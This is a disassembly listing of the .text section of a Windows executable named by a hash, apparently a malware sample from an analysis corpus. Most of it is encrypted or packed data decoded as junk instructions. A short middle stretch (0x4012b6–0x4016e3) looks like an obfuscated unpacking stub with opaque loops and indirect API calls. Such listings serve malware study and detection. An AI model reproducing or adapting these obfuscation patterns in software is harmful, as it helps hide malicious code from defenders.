
a6c2808e115e7c9c41d58cde5dce14793818712c1eeff504e8cf1b7ef951b709.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x42a775
  40100c:	jmp    0x4012ab
  401011:	(bad)  
  401012:	into   
  401013:	(bad)  
  401014:	rcr    edx,cl
  401016:	(bad)  
  401018:	aad    0xdf
  40101a:	mov    ebx,0x109f0cf7
  40101f:	repz pop esi
  401021:	js     0x40109b
  401023:	js     0x40109d
  401025:	(bad)  
  401026:	jle    0x4010a0
  401028:	js     0x400ff2
  40102a:	xlat   BYTE PTR ds:[ebx]
  40102b:	cmp    eax,0xcfdbc1d5
  401030:	fld    st(0)
  401032:	pop    es
  401033:	push   es
  401034:	or     eax,DWORD PTR [esi]
  401036:	jae    0x401042
  401038:	or     BYTE PTR [ebx],bh
  40103a:	bswap  edx
  40103c:	and    al,bh
  40103e:	sbb    bl,BYTE PTR [edi]
  401040:	inc    ecx
  401041:	bound  ecx,QWORD PTR [edx]
  401043:	mov    bh,0xdd
  401045:	or     bh,ch
  401047:	mov    ebp,0x880bd0e3
  40104c:	and    BYTE PTR [eax+0x1549a4f6],bh
  401052:	lods   eax,DWORD PTR ds:[esi]
  401053:	fadd   DWORD PTR [eax+0x1f]
  401056:	pusha  
  401057:	out    dx,al
  401058:	outs   dx,DWORD PTR ds:[esi]
  401059:	adc    ebx,DWORD PTR [ecx]
  40105b:	sahf   
  40105c:	add    dl,al
  40105e:	dec    edx
  40105f:	lods   al,BYTE PTR ds:[esi]
  401060:	pop    ebx
  401061:	sub    eax,0xad3ec6d9
  401066:	mov    WORD PTR [ebx],es
  401068:	lds    esi,FWORD PTR [ebx-0x76243a00]
  40106e:	adc    eax,0x3af3c19a
  401074:	xchg   ebx,eax
  401075:	icebp  
  401076:	dec    edi
  401077:	loopne 0x401019
  401079:	dec    ecx
  40107a:	call   DWORD PTR [edi-0x234ef85e]
  401080:	mov    ebp,0x5530ed4d
  401085:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  40108c:	sbb    ebx,ecx
  40108e:	xchg   esp,eax
  40108f:	sub    esi,edx
  401091:	repz pop eax
  401093:	(bad)  
  401094:	out    0x42,al
  401096:	cli    
  401097:	in     al,dx
  401098:	xchg   esp,eax
  401099:	cmp    edi,ecx
  40109b:	jbe    0x401102
  40109d:	xlat   BYTE PTR ds:[ebx]
  40109e:	sub    cl,ch
  4010a0:	add    al,0xe1
  4010a2:	sbb    DWORD PTR [ecx-0x60],ebx
  4010a5:	xor    eax,0x2696f0b
  4010aa:	adc    bh,BYTE PTR [ecx]
  4010ac:	fisttp QWORD PTR [eax+0x7f753256]
  4010b2:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010b8:	arpl   WORD PTR [ebp-0x23],dx
  4010bb:	rcl    BYTE PTR [ecx],1
  4010bd:	fistp  DWORD PTR [esi-0x1f]
  4010c0:	and    DWORD PTR [ecx-0x68],edi
  4010c3:	inc    eax
  4010c4:	push   ebx
  4010c5:	aaa    
  4010c6:	adc    eax,0x1c317733
  4010cb:	fstp   TBYTE PTR [eax]
  4010cd:	dec    edi
  4010ce:	repnz into 
  4010d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010d1:	mov    ebp,0x188c0c7c
  4010d6:	jnp    0x4010c7
  4010d8:	pop    eax
  4010d9:	fild   QWORD PTR [ecx-0x1a8af86e]
  4010df:	fnstcw WORD PTR [eax]
  4010e1:	push   0x1d
  4010e3:	lods   eax,DWORD PTR ds:[esi]
  4010e4:	leave  
  4010e5:	inc    edx
  4010e6:	pop    eax
  4010e7:	xor    eax,0xf195b65b
  4010ec:	jl     0x4010b9
  4010ee:	xor    al,0xf1
  4010f0:	or     ebp,ebx
  4010f2:	retf   
  4010f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4010f4:	daa    
  4010f5:	daa    
  4010f6:	inc    bp
  4010f8:	jle    0x4010a3
  4010fa:	retf   
  4010fb:	aad    0x38
  4010fd:	adc    al,0x85
  4010ff:	(bad)  [ecx-0x62]
  401102:	sub    ebx,0x7e
  401105:	dec    ebx
  401106:	mov    edx,0x6dd08b82
  40110b:	jle    0x401179
  40110d:	lods   eax,DWORD PTR ds:[esi]
  40110e:	ffreep st(5)
  401110:	xor    eax,0xf6d2a424
  401115:	cmp    DWORD PTR [ebx],edx
  401117:	scas   al,BYTE PTR es:[edi]
  401118:	imul   ecx,DWORD PTR [esi+eiz*4-0x7],0xffffffb0
  40111d:	cmp    DWORD PTR [esi-0x6ec677bd],ecx
  401123:	adc    al,0x17
  401125:	inc    ebx
  401126:	add    DWORD PTR [edi-0x7d],eax
  401129:	add    dh,BYTE PTR [eax+0x42]
  40112c:	pop    esi
  40112d:	repz aas 
  40112f:	xchg   esp,eax
  401130:	(bad)
  401133:	nop
  401134:	and    al,0xa2
  401136:	mov    BYTE PTR [eax-0x72],dh
  401139:	std    
  40113a:	popf   
  40113b:	and    al,0x39
  40113d:	pop    eax
  40113e:	jae    0x4010f4
  401140:	aaa    
  401141:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401142:	mov    ebp,0x4cdb04b7
  401147:	push   eax
  401148:	or     dl,ch
  40114a:	clc    
  40114b:	xor    DWORD PTR [edx-0x45],ecx
  40114e:	enter  0x8beb,0xcc
  401152:	imul   esp,DWORD PTR [edi],0x57127b11
  401158:	outs   dx,DWORD PTR ds:[esi]
  401159:	aam    0xa
  40115b:	js     0x4010f5
  40115d:	sub    DWORD PTR [ecx],0x86aed40d
  401163:	push   ebp
  401164:	sbb    bh,al
  401166:	push   ecx
  401167:	pop    ds
  401168:	popa   
  401169:	arpl   sp,dx
  40116b:	addr16 mov edi,0xe44a2622
  401171:	cwde   
  401172:	ins    BYTE PTR es:[edi],dx
  401173:	or     al,0xc0
  401175:	inc    edi
  401176:	je     0x4011f2
  401178:	and    al,0xa9
  40117a:	adc    ch,BYTE PTR [edx-0x5537b00a]
  401180:	rcr    DWORD PTR [edx+0x381f372c],0xf3
  401187:	mov    ah,0xea
  401189:	jge    0x401120
  40118b:	pop    es
  40118c:	mov    ah,0x39
  40118e:	cld    
  40118f:	cs push cs
  401191:	or     bh,BYTE PTR [edx+0x7d094b98]
  401197:	push   ds
  401198:	and    edi,DWORD PTR [ebp-0x24]
  40119b:	pop    es
  40119c:	push   esi
  40119d:	add    DWORD PTR [eax+ecx*4+0x64],edx
  4011a1:	jg     0x4011a5
  4011a3:	sbb    DWORD PTR [ebp-0x67e8a9b8],ebx
  4011a9:	inc    eax
  4011aa:	cld    
  4011ab:	mov    ebx,0xab816d03
  4011b0:	xor    ecx,0x468e7b39
  4011b6:	fwait
  4011b7:	xchg   ecx,eax
  4011b8:	xchg   BYTE PTR [ebp+0x69],al
  4011bb:	in     eax,dx
  4011bc:	jmp    0xa9f3ab60
  4011c1:	je     0x4011f4
  4011c3:	lea    esi,[esp+esi*8-0x18958bdd]
  4011ca:	inc    ebx
  4011cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011cc:	pop    ax
  4011ce:	enter  0xbded,0xe5
  4011d2:	int3   
  4011d3:	push   ds
  4011d4:	push   cs
  4011d5:	popf   
  4011d6:	add    al,0x92
  4011d8:	ss fs push edx
  4011db:	pop    edi
  4011dc:	(bad)  
  4011dd:	fcom   DWORD PTR [ecx]
  4011df:	nop
  4011e0:	and    DWORD PTR [ebp+ebx*4-0x1ed80757],esp
  4011e7:	loope  0x401177
  4011e9:	pop    esp
  4011ea:	scas   al,BYTE PTR es:[edi]
  4011eb:	cmp    BYTE PTR [edx],ah
  4011ed:	neg    al
  4011ef:	fucomip st,st(6)
  4011f1:	xchg   esp,eax
  4011f2:	mov    ah,0xf3
  4011f4:	inc    ecx
  4011f5:	sti    
  4011f6:	and    BYTE PTR [ecx+0x79],ah
  4011f9:	xchg   esi,eax
  4011fa:	mov    bh,0x2d
  4011fc:	mov    ds:0x29568991,al
  401201:	xchg   ebx,eax
  401202:	in     al,0x88
  401204:	jg     0x4011ba
  401206:	call   ebx
  401208:	inc    ecx
  401209:	pop    edi
  40120a:	sahf   
  40120b:	sub    esp,DWORD PTR [ebx+0x3e819368]
  401211:	pop    ebp
  401212:	sub    bl,bh
  401214:	sbb    ecx,DWORD PTR [edx+eiz*8+0x5ae1202b]
  40121b:	(bad)  
  40121c:	or     DWORD PTR [edi-0x58],ebp
  40121f:	push   0x42dd6ee6
  401224:	cmp    DWORD PTR [edi],eax
  401226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401227:	stos   BYTE PTR es:[edi],al
  401228:	ficom  WORD PTR [ecx+0x20]
  40122b:	mov    ebp,0x53e87146
  401230:	adc    ebx,0x9886b70a
  401236:	aaa    
  401237:	mov    ebp,0x980ec2f5
  40123c:	fistp  DWORD PTR [edi-0x1f]
  40123f:	stc    
  401240:	idiv   DWORD PTR [eax]
  401242:	cmp    al,BYTE PTR [esi-0x792e3be0]
  401248:	mov    WORD PTR [ebp-0x73],gs
  40124b:	cmp    BYTE PTR [edx+0x28],dl
  40124e:	daa    
  40124f:	push   0x57de2e78
  401254:	or     BYTE PTR [edi],al
  401256:	push   ebx
  401257:	retf   0xbdd4
  40125a:	stos   BYTE PTR es:[edi],al
  40125b:	iret   
  40125c:	xchg   DWORD PTR [eax-0x6edf4800],ebx
  401262:	mov    al,0xd2
  401264:	cs jns 0x401242
  401267:	add    dh,cl
  401269:	mov    bl,0x3f
  40126c:	jb     0x401291
  40126e:	hlt    
  40126f:	push   ebx
  401270:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401271:	add    DWORD PTR [eax+0x46],ecx
  401274:	dec    ecx
  401275:	mov    eax,es
  401277:	sub    bl,BYTE PTR [edi]
  401279:	in     al,0x5e
  40127b:	jne    0x4012b0
  40127d:	jo     0x401265
  40127f:	mov    ch,0x47
  401281:	add    ch,BYTE PTR [edx+ecx*8-0x7eb19cf6]
  401288:	jno    0x4012a2
  40128a:	das    
  40128b:	pop    ss
  40128c:	test   dh,0xb8
  40128f:	inc    edx
  401290:	sub    edi,DWORD PTR [edx+0x71]
  401293:	in     eax,0xdd
  401295:	cmp    edi,ecx
  401297:	in     eax,0xff
  401299:	call   0xe41d:0x3e064e9
  4012a0:	outs   dx,BYTE PTR ds:[esi]
  4012a1:	ret    0x6f4c
  4012a4:	lahf   
  4012a5:	jbe    0x401291
  4012a7:	pop    esi
  4012a8:	sbb    al,BYTE PTR [edx-0x15195ee2]
  4012ae:	inc    ecx
  4012af:	add    BYTE PTR [ecx],dh
  4012b1:	adc    eax,0x42a80d
  4012b6:	mov    eax,DWORD PTR [eax+0x198]
  4012bc:	mov    ecx,DWORD PTR ds:0x42a7c1
  4012c2:	or     DWORD PTR ds:0x42a76d,ecx
  4012c8:	mov    DWORD PTR [ebp-0x8],eax
  4012cb:	mov    DWORD PTR ds:0x42a75d,0x436b
  4012d5:	mov    eax,DWORD PTR [ebp+0x8]
  4012d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4012db:	push   ebx
  4012dc:	or     DWORD PTR ds:0x42a7c1,edx
  4012e2:	push   esi
  4012e3:	add    esi,DWORD PTR ds:0x42a7b5
  4012e9:	mov    esi,0x7510850
  4012ee:	and    ebx,0x1c58
  4012f4:	xor    eax,esi
  4012f6:	and    DWORD PTR ds:0x42a839,0x0
  401300:	jmp    0x401312
  401305:	mov    ebx,DWORD PTR ds:0x42a839
  40130b:	inc    ebx
  40130c:	mov    DWORD PTR ds:0x42a839,ebx
  401312:	cmp    DWORD PTR ds:0x42a839,0x11
  401319:	jae    0x401344
  40131f:	cmp    DWORD PTR ds:0x42a839,0x16
  401326:	jne    0x401335
  40132c:	push   DWORD PTR [ebp-0x1c]
  40132f:	call   DWORD PTR ds:0x41d180
  401335:	jmp    0x401305
  40133a:	adc    DWORD PTR ds:0x42a781,0x42a805
  401344:	push   edi
  401345:	and    DWORD PTR ds:0x42a809,0x0
  40134f:	jmp    0x401361
  401354:	mov    edi,DWORD PTR ds:0x42a809
  40135a:	inc    edi
  40135b:	mov    DWORD PTR ds:0x42a809,edi
  401361:	cmp    DWORD PTR ds:0x42a809,0x1d
  401368:	jae    0x4013a9
  40136e:	cmp    DWORD PTR ds:0x42a809,0xe
  401375:	jne    0x401384
  40137b:	push   DWORD PTR [ebp-0x10]
  40137e:	call   DWORD PTR ds:0x41d0b4
  401384:	cmp    DWORD PTR ds:0x42a809,0xd
  40138b:	jne    0x40139e
  401391:	mov    edi,DWORD PTR ds:0x42a809
  401397:	inc    edi
  401398:	mov    DWORD PTR ds:0x42a809,edi
  40139e:	jmp    0x401354
  4013a3:	sub    DWORD PTR ds:0x42a7b5,edx
  4013a9:	mov    edi,0x327298
  4013ae:	mov    DWORD PTR ds:0x42a76d,0x11
  4013b8:	cmp    DWORD PTR ds:0x42a76d,0x0
  4013bf:	je     0x4016af
  4013c5:	cmp    DWORD PTR ds:0x42a76d,0x2
  4013cc:	jne    0x4013e4
  4013d2:	push   0x42a7b5
  4013d7:	push   0x0
  4013d9:	push   0x42a9cd
  4013de:	call   DWORD PTR ds:0x41d0b8
  4013e4:	cmp    DWORD PTR ds:0x42a76d,0x3
  4013eb:	jne    0x4013fe
  4013f1:	mov    ebx,DWORD PTR ds:0x42a76d
  4013f7:	dec    ebx
  4013f8:	mov    DWORD PTR ds:0x42a76d,ebx
  4013fe:	mov    ebx,DWORD PTR ds:0x42a76d
  401404:	dec    ebx
  401405:	mov    DWORD PTR ds:0x42a76d,ebx
  40140b:	jmp    0x4013b8
  401410:	jmp    0x4016af
  401415:	leave  
  401416:	rol    dh,0xcf
  401419:	leave  
  40141a:	int    0xd9
  40141c:	fimul  DWORD PTR [edx]
  40141e:	leave  
  40141f:	rcl    BYTE PTR [ecx+0x13],1
  401422:	sbb    bl,ah
  401424:	call   0x7efe:0x78787efe
  40142b:	js     0x4014a5
  40142d:	inc    eax
  40142e:	int3   
  40142f:	jne    0x4014ad
  401431:	sbb    BYTE PTR ss:[edi-0x71c0632e],dh
  401438:	pushf  
  401439:	xchg   edi,eax
  40143a:	push   ss
  40143b:	not    BYTE PTR [edx+0x76]
  40143e:	jp     0x40147d
  401440:	add    eax,0x70b25651
  401445:	aaa    
  401446:	fisub  WORD PTR [edi+0x44836b1f]
  40144c:	inc    eax
  40144d:	ss mov cl,0xbc
  401450:	adc    edx,DWORD PTR [eax+eax*8]
  401453:	icebp  
  401454:	out    dx,eax
  401455:	sub    eax,0x3f9a19ea
  40145a:	push   0xfffffff1
  40145c:	push   esi
  40145d:	pushf  
  40145e:	popf   
  40145f:	dec    edi
  401460:	xor    al,0x62
  401462:	(bad)  
  401463:	sub    edx,DWORD PTR [edi-0x5481e736]
  401469:	inc    edi
  40146a:	fdiv   QWORD PTR [eax]
  40146c:	sar    DWORD PTR [edx+ecx*2],0xe1
  401470:	mov    ah,0xe8
  401472:	cmp    ch,BYTE PTR [eax-0x2aa4e61]
  401478:	and    al,0x77
  40147a:	repnz sbb ebx,DWORD PTR [eax+0x1bab7c48]
  401481:	mov    ah,0x11
  401483:	popf   
  401484:	mov    ah,0x10
  401486:	xchg   ecx,eax
  401487:	aad    0x5f
  401489:	xchg   ebp,eax
  40148a:	inc    ebp
  40148b:	ds loop 0x401444
  40148e:	xor    eax,0x9a39bcb4
  401493:	clc    
  401494:	enter  0xdf3f,0x91
  401498:	imul   ecx,DWORD PTR [edi+eax*4],0xf2f6c7c3
  40149f:	repz mov dl,0xc2
  4014a2:	aas    
  4014a3:	mov    bh,BYTE PTR [ecx]
  4014a5:	retf   
  4014a6:	ror    DWORD PTR [ecx+0x15],cl
  4014a9:	xchg   ebx,eax
  4014aa:	dec    ebx
  4014ab:	mov    edi,0x8f6deb3
  4014b0:	fisttp QWORD PTR [ebp+0x5]
  4014b3:	adc    DWORD PTR [ecx],eax
  4014b5:	inc    ebx
  4014b6:	cwde   
  4014b7:	in     eax,0x89
  4014b9:	pop    esi
  4014ba:	repz ret 0x774a
  4014be:	sub    eax,esi
  4014c0:	xor    cl,BYTE PTR [esi-0x4b081d46]
  4014c6:	sub    ecx,DWORD PTR [esi+esi*1+0x6f75b4a4]
  4014cd:	das    
  4014ce:	aam    0xee
  4014d0:	rcl    DWORD PTR [edi],0xf1
  4014d3:	into   
  4014d4:	dec    ebp
  4014d5:	xor    al,0x81
  4014d7:	pop    ebx
  4014d8:	(bad)  
  4014da:	mov    esi,0xd0bef7cf
  4014df:	jg     0x401470
  4014e1:	sbb    esp,DWORD PTR [ebp+0x15d58200]
  4014e7:	jmp    0xa3ff:0xf3d493ce
  4014ee:	sbb    DWORD PTR [ebp-0xcd71743],ebx
  4014f4:	xlat   BYTE PTR ds:[ebx]
  4014f5:	repz xchg ebp,eax
  4014f7:	push   0x74
  4014f9:	(bad)  
  4014fa:	fmul   DWORD PTR [esi]
  4014fc:	aam    0xbf
  4014fe:	js     0x401554
  401500:	pop    edx
  401501:	pfacc  mm3,mm5
  401505:	call   0xf11d8dae
  40150a:	mov    esi,0x76c0ff29
  40150f:	adc    eax,0x6b3a0ca9
  401514:	sub    BYTE PTR [eax+0x44],cl
  401517:	mov    dl,0x68
  401519:	in     al,dx
  40151a:	jecxz  0x4014a9
  40151c:	jae    0x401565
  40151e:	push   0xfffffff9
  401520:	push   es
  401521:	jns    0x401577
  401523:	ins    DWORD PTR es:[edi],dx
  401524:	inc    edx
  401525:	jge    0x401575
  401527:	fucomp st(6)
  401529:	bound  edx,QWORD PTR [eax]
  40152b:	push   cs
  40152c:	xor    eax,0xe1ecd052
  401531:	pop    esi
  401532:	xor    BYTE PTR [ebx+0x18],ch
  401535:	xrelease mov DWORD PTR [ebx-0x4071ebe],0xac84fc3f
  401540:	mov    cs,WORD PTR [edx-0x71]
  401543:	or     edx,esi
  401545:	push   ecx
  401546:	dec    esi
  401547:	sub    edi,DWORD PTR [edi]
  401549:	sub    ecx,DWORD PTR [edx+0x3c]
  40154c:	ins    DWORD PTR es:[edi],dx
  40154d:	or     BYTE PTR [edx],bh
  40154f:	add    al,0xfa
  401551:	pop    ebx
  401552:	(bad)  
  401553:	lods   eax,DWORD PTR ds:[esi]
  401554:	cmp    al,0x6f
  401556:	fwait
  401557:	arpl   WORD PTR [ebp-0x64e43ba5],ax
  40155d:	xor    dh,ah
  40155f:	sahf   
  401560:	mov    eax,ds:0x73567531
  401565:	retf   
  401566:	dec    edi
  401567:	int3   
  401568:	stos   BYTE PTR es:[edi],al
  401569:	adc    edx,DWORD PTR [ecx]
  40156b:	sbb    DWORD PTR [ebp+0x2d52f4b1],0xd3b254bc
  401575:	xor    ah,bl
  401577:	jecxz  0x4015c0
  401579:	and    eax,0xc4730fe5
  40157e:	push   ebp
  40157f:	adc    ax,0x8907
  401583:	addr16 mov esi,0x6e5b1778
  401589:	sbb    al,0x93
  40158b:	add    BYTE PTR [eax+0x3d],bl
  40158e:	nop
  40158f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401590:	out    0x80,eax
  401592:	mov    al,ds:0xd9cf7591
  401597:	jmp    0x9ac:0xfdbf1527
  40159e:	pop    esi
  40159f:	lahf   
  4015a0:	fild   QWORD PTR [edi+0x0]
  4015a3:	aaa    
  4015a4:	or     dh,BYTE PTR [eax+eax*4]
  4015a7:	jmp    0x2d7083d1
  4015ac:	inc    ebx
  4015ad:	out    dx,eax
  4015ae:	jg     0x401548
  4015b0:	lods   al,BYTE PTR gs:[esi]
  4015b2:	xchg   ecx,eax
  4015b3:	sbb    al,0xd3
  4015b5:	mov    ecx,0x23f35cb4
  4015ba:	push   ss
  4015bb:	or     cl,ch
  4015bd:	cli    
  4015be:	ins    DWORD PTR es:[edi],dx
  4015bf:	or     bl,BYTE PTR [edx+eiz*4]
  4015c2:	cmp    DWORD PTR [eax],esp
  4015c4:	lock or eax,DWORD PTR [edx+0x23]
  4015c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015c9:	add    BYTE PTR [ebx+0x5cf986b0],ch
  4015cf:	push   ebx
  4015d0:	or     al,0x72
  4015d2:	retf   
  4015d3:	dec    esp
  4015d4:	mov    BYTE PTR [eax-0x21],ah
  4015d7:	push   0x32
  4015d9:	sbb    esi,ebx
  4015db:	mov    eax,ds:0xe0b5804f
  4015e0:	rcl    ebp,1
  4015e2:	mov    ch,0x80
  4015e4:	sbb    BYTE PTR [ebx+eiz*8],cl
  4015e7:	xor    BYTE PTR [edi+0x76],bh
  4015ea:	popa   
  4015eb:	lds    ecx,FWORD PTR [esi-0x29]
  4015ee:	jmp    0x3b55:0x7b30cf13
  4015f5:	sbb    BYTE PTR [edx],0xa6
  4015f8:	push   ebp
  4015f9:	inc    ebx
  4015fa:	mov    ?,WORD PTR ds:[bx+si-0x693e]
  401600:	pop    ss
  401601:	xchg   esi,eax
  401602:	push   es
  401603:	xchg   edx,eax
  401604:	data16 clc 
  401606:	xchg   esp,eax
  401607:	cmp    al,0x29
  401609:	add    eax,0x9d2c9a1e
  40160e:	mov    dh,0x3d
  401610:	fdivr  DWORD PTR [eax-0x8dfee3f]
  401616:	sar    DWORD PTR ds:0x36d77ea0,cl
  40161c:	pop    eax
  40161d:	mov    esp,0x51bf4e4a
  401622:	lods   al,BYTE PTR ds:[esi]
  401623:	sbb    bh,dh
  401625:	sub    eax,0x92e98db5
  40162a:	add    eax,0x80b8928a
  40162f:	js     0x401691
  401631:	cmp    al,0x95
  401633:	in     al,0x77
  401635:	adc    dh,bl
  401637:	(bad)  
  401638:	sbb    ebp,DWORD PTR [ecx+ebp*2]
  40163b:	jl     0x4015e1
  40163d:	fucomip st,st(5)
  40163f:	icebp  
  401640:	xor    eax,0xc47f76ac
  401645:	outs   dx,BYTE PTR ds:[esi]
  401646:	ror    BYTE PTR [ebx],1
  401648:	or     al,0xd8
  40164a:	out    0x3b,al
  40164c:	cmp    DWORD PTR [edi],edi
  40164e:	inc    ebx
  40164f:	cli    
  401650:	iret   
  401651:	sbb    eax,DWORD PTR [ebp-0x5]
  401654:	and    eax,0xf0480b58
  401659:	repz (bad) 
  40165b:	dec    edi
  40165c:	add    bh,BYTE PTR [edi+eax*8+0x3f1a4b6b]
  401663:	sbb    al,BYTE PTR [ebx+0x15f581b6]
  401669:	sti    
  40166a:	imul   edi,DWORD PTR [eax+0x16234565],0x2019b17a
  401674:	cdq    
  401675:	add    cl,dh
  401677:	mov    ebp,0xdc98bddf
  40167c:	jnp    0x40167e
  40167e:	xchg   esp,eax
  40167f:	pop    edi
  401680:	arpl   WORD PTR [ebp+0x19aecd78],bx
  401686:	int    0x9f
  401688:	pop    es
  401689:	mov    ah,0xbf
  40168b:	bound  esi,QWORD PTR [esi]
  40168d:	or     al,0x87
  40168f:	pop    edi
  401690:	add    cl,0x86
  401693:	in     eax,0x9d
  401695:	push   cs
  401696:	pop    edx
  401697:	imul   bx,WORD PTR [eax],0x447e
  40169c:	and    eax,0x91b46895
  4016a1:	push   ecx
  4016a2:	popa   
  4016a3:	nop
  4016a4:	dec    edx
  4016a5:	test   BYTE PTR [edx],dl
  4016a7:	(bad)  
  4016a8:	adc    DWORD PTR [eax],0x4b
  4016ab:	dec    ecx
  4016ac:	aaa    
  4016ad:	adc    eax,ebx
  4016af:	add    eax,edi
  4016b1:	xor    DWORD PTR ds:0x42a84d,0x53dc
  4016bb:	mov    DWORD PTR [ecx],eax
  4016bd:	adc    DWORD PTR ds:0x42a7b9,edi
  4016c3:	lea    eax,[ebp-0x4]
  4016c6:	or     DWORD PTR ds:0x42a769,0x42a75d
  4016d0:	mov    DWORD PTR [ebp-0x10],eax
  4016d3:	xor    DWORD PTR ds:0x42a76d,ebx
  4016d9:	mov    eax,DWORD PTR [ebp+0x8]
  4016dc:	neg    ecx
  4016de:	mov    ecx,DWORD PTR [ebp-0x10]
  4016e1:	xor    eax,esi
  4016e3:	jmp    0x401982
  4016e8:	ret    0x3dc5
  4016eb:	ret    
  4016ec:	leave  
  4016ed:	retf   
  4016ee:	ret    0xebc5
  4016f1:	out    0x4b,eax
  4016f3:	movss  xmm3,DWORD PTR [ecx+0x78037ca7]
  4016fb:	js     0x4016fb
  4016fd:	jle    0x401777
  4016ff:	js     0x401756
  401701:	push   cs
  401702:	sub    al,0x71
  401704:	sti    
  401705:	cmp    al,0x26
  401707:	jae    0x40177a
  401709:	inc    ebp
  40170a:	xor    al,0xb7
  40170c:	sub    eax,0x62372fce
  401711:	sbb    edi,esi
  401713:	push   0xffffffb2
  401715:	and    esi,DWORD PTR [ecx+0x1]
  401718:	jno    0x40178b
  40171a:	mov    dh,0x77
  40171c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40171d:	loope  0x401798
  40171f:	lods   eax,DWORD PTR cs:[esi]
  401721:	inc    edx
  401722:	nop
  401723:	jl     0x40179d
  401725:	lds    eax,FWORD PTR [ecx+0x35]
  401728:	xlat   BYTE PTR ds:[ebx]
  401729:	cli    
  40172a:	in     eax,0x10
  40172c:	loop   0x4016c6
  40172e:	pop    edi
  40172f:	dec    edx
  401730:	push   esi
  401731:	and    BYTE PTR [edi+esi*2-0x18f2ba91],0x7b
  401739:	pusha  
  40173a:	test   BYTE PTR [edi+ebx*8-0x8b689f8],bh
  401741:	mov    ds:0x54fb19cd,al
  401746:	pop    ecx
  401747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401748:	mov    cl,0x16
  40174a:	nop
  40174b:	xor    eax,0x1c514f6
  401750:	cdq    
  401751:	ficomp DWORD PTR [edx-0x3]
  401754:	jmp    0x243d05bd
  401759:	jo     0x401752
  40175b:	fucomip st,st(0)
  40175d:	aas    
  40175e:	mov    al,ds:0x9634b548
  401763:	mov    al,ds:0x1587c915
  401769:	and    esi,esi
  40176b:	adc    cl,dl
  40176d:	je     0x40174d
  40176f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401770:	sub    DWORD PTR [edi+0x54],esp
  401773:	popf   
  401774:	add    al,0xc3
  401776:	mov    ds:0xc85005a4,eax
  40177b:	std    
  40177c:	sbb    edx,DWORD PTR [eax+0x7f]
  40177f:	xor    bh,bh
  401781:	mov    BYTE PTR [esi+0x572d215f],bh
  401787:	pusha  
  401788:	jge    0x401790
  40178a:	fs jl  0x401740
  40178d:	call   0x318f:0xda944913
  401794:	cdq    
  401795:	std    
  401796:	stos   DWORD PTR es:[edi],eax
  401797:	lahf   
  401798:	(bad)  
  401799:	in     al,dx
  40179a:	mov    ecx,0xc470047
  40179f:	or     BYTE PTR ds:0xb2e1e467,dh
  4017a5:	pop    ecx
  4017a6:	ror    DWORD PTR [ebx+eax*2+0x73],0xde
  4017ab:	imul   eax,DWORD PTR [esi+0x29],0xffffffa1
  4017af:	dec    ecx
  4017b0:	jnp    0x401817
  4017b2:	mov    esp,0xaf970f37
  4017b7:	jmp    0xfe002612
  4017bc:	in     eax,0x38
  4017be:	int3   
  4017bf:	fidivr DWORD PTR [edi-0x1a]
  4017c2:	inc    ebx
  4017c3:	cmp    eax,0x59febc94
  4017c8:	daa    
  4017c9:	inc    ebp
  4017ca:	aad    0x9d
  4017cc:	or     bl,0x11
  4017cf:	loope  0x401786
  4017d1:	sbb    dl,BYTE PTR [ebx-0x350cc081]
  4017d7:	mov    WORD PTR [edx],?
  4017d9:	add    al,0x7
  4017db:	(bad)  
  4017dc:	gs sti 
  4017de:	pop    ss
  4017df:	push   ds
  4017e0:	ins    DWORD PTR es:[edi],dx
  4017e1:	ret    
  4017e2:	addr16 jp 0x401863
  4017e5:	jp     0x4017ef
  4017e7:	gs jge 0x4017bd
  4017ea:	mov    al,ds:0x883c83fa
  4017ef:	xchg   edi,eax
  4017f0:	sbb    al,0xfa
  4017f2:	jecxz  0x4017f8
  4017f4:	mov    al,0xa0
  4017f6:	sub    al,0xf8
  4017f8:	add    edi,DWORD PTR [ebx]
  4017fa:	ja     0x4017aa
  4017fc:	enter  0xecf5,0xe0
  401800:	xchg   esp,eax
  401801:	mov    ah,0xde
  401803:	mov    edx,0x5709ca25
  401808:	push   esi
  401809:	faddp  st(5),st
  40180b:	popa   
  40180c:	inc    esp
  40180d:	lods   eax,DWORD PTR ds:[esi]
  40180e:	jns    0x4017a1
  401810:	mov    ah,0xe8
  401812:	hlt    
  401813:	out    0x97,al
  401815:	dec    ecx
  401816:	lahf   
  401817:	mov    ebp,0xe1f6bb6f
  40181c:	cmp    eax,0x65d83711
  401821:	or     dh,BYTE PTR [edx-0x24]
  401824:	(bad)  
  401825:	or     BYTE PTR [ebx],dl
  401827:	sub    bh,BYTE PTR [esi-0x5a4f2798]
  40182d:	mov    eax,0xeaa31eb0
  401832:	adc    al,0x90
  401834:	push   cs
  401835:	lock mov fs,WORD PTR [esi+eax*4-0x80]
  40183a:	xor    al,0x54
  40183c:	mov    ch,0x1
  40183e:	call   0x6629:0x3618962a
  401845:	fbstp  TBYTE PTR [esp+esi*2]
  401848:	fild   QWORD PTR [ebp-0x77]
  40184b:	loopne 0x4018cc
  40184d:	push   esp
  40184e:	dec    edx
  40184f:	cld    
  401850:	loop   0x4018c4
  401852:	mov    esp,0xb8fef13b
  401857:	cs std 
  401859:	ins    BYTE PTR es:[edi],dx
  40185a:	retf   0x8423
  40185d:	ret    
  40185e:	imul   ebp,DWORD PTR [edi],0x81cbe5b
  401864:	cmp    eax,0x3730f73
  401869:	pop    eax
  40186a:	int    0xd
  40186c:	(bad)  
  40186d:	and    al,0xa4
  40186f:	dec    esi
  401870:	sti    
  401871:	aaa    
  401872:	inc    ecx
  401873:	aam    0xf1
  401875:	js     0x401812
  401877:	out    dx,al
